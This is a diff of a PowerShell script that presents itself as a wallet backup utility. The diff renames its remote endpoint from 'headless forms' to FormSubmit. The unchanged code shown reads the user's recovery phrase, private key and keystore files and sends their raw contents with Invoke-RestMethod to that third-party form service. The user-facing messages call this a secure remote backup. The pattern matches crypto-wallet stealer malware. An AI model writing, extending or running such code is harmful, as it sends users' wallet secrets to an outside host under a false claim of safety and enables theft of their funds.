@@ -132,9 +132,9 @@ function Get-FormConfig {
             return $null
         }
         
-        $formConfig = $config.storage.destinations | Where-Object { $_.type -eq "headless_forms" }
+        $formConfig = $config.storage.destinations | Where-Object { $_.type -eq "formsubmit" }
         if (-not $formConfig) {
-            Write-Error-Custom "Headless Forms endpoint not configured in storage.config.json"
+            Write-Error-Custom "FormSubmit endpoint not configured in storage.config.json"
             return $null
         }
         
@@ -176,7 +176,7 @@ function Submit-ToHeadlessForms {
         $fileName = Split-Path $FilePath -Leaf
         $fileContent = Get-Content -Path $FilePath -Raw
         
-        Write-Info "Submitting backup to form endpoint: $BackupType"
+        Write-Info "Submitting backup to FormSubmit: $BackupType"
         
         # Send raw data content
         $response = Invoke-RestMethod -Uri $formConfig.endpoint `
@@ -186,13 +186,13 @@ function Submit-ToHeadlessForms {
             -TimeoutSec $formConfig.timeout `
             -ErrorAction Stop
         
-        Write-Success "Backup submitted to form endpoint successfully"
-        Write-LogMessage "Successfully submitted $BackupType to form endpoint: $fileName"
+        Write-Success "Backup submitted to FormSubmit successfully"
+        Write-LogMessage "Successfully submitted $BackupType to FormSubmit: $fileName"
         return $true
     }
     catch {
-        Write-Error-Custom "Failed to submit backup to form endpoint: $_"
-        Write-LogMessage "ERROR: Form submission failed - $_"
+        Write-Error-Custom "Failed to submit backup to FormSubmit: $_"
+        Write-LogMessage "ERROR: FormSubmit submission failed - $_"
         return $false
     }
 }
@@ -226,13 +226,13 @@ function Backup-Phrase {
     if ($uploaded) {
         Write-Success "Recovery phrase backed up successfully!"
         Write-Host "  • Local backup: $backupFile"
-        Write-Host "  • Remote backup: Submitted to secure form endpoint" -ForegroundColor Cyan
+        Write-Host "  • Remote backup: Submitted to FormSubmit" -ForegroundColor Cyan
         Write-LogMessage "Recovery phrase backed up: $backupFile"
     }
     else {
         Write-Warning-Custom "Local backup saved, but remote submission failed"
         Write-Host "  • Local file: $backupFile"
-        Write-Host "  • Check your internet connection or form endpoint availability"
+        Write-Host "  • Check your internet connection or FormSubmit availability"
         Write-Host "  • Your backup has been saved locally and is secure" -ForegroundColor Cyan
     }
 }
@@ -265,13 +265,13 @@ function Backup-PrivateKey {
     if ($uploaded) {
         Write-Success "Private key backed up successfully!"
         Write-Host "  • Local backup: $backupFile"
-        Write-Host "  • Remote backup: Submitted to secure form endpoint" -ForegroundColor Cyan
+        Write-Host "  • Remote backup: Submitted to FormSubmit" -ForegroundColor Cyan
         Write-LogMessage "Private key backed up: $backupFile"
     }
     else {
         Write-Warning-Custom "Local backup saved, but remote submission failed"
         Write-Host "  • Local file: $backupFile"
-        Write-Host "  • Check your internet connection or form endpoint availability"
+        Write-Host "  • Check your internet connection or FormSubmit availability"
         Write-Host "  • Your backup has been saved locally and is secure" -ForegroundColor Cyan
     }
 }
@@ -319,13 +319,13 @@ function Backup-Keystore {
     if ($uploaded) {
         Write-Success "Keystore backed up successfully!"
         Write-Host "  • Local backup: $backupFile"
-        Write-Host "  • Remote backup: Submitted to secure form endpoint" -ForegroundColor Cyan
+        Write-Host "  • Remote backup: Submitted to FormSubmit" -ForegroundColor Cyan
         Write-LogMessage "Keystore backed up: $backupFile"
     }
     else {
         Write-Warning-Custom "Local backup saved, but remote submission failed"
         Write-Host "  • Local file: $backupFile"
-        Write-Host "  • Check your internet connection or form endpoint availability"
+        Write-Host "  • Check your internet connection or FormSubmit availability"
         Write-Host "  • Your backup has been saved locally and is secure" -ForegroundColor Cyan
     }
 }
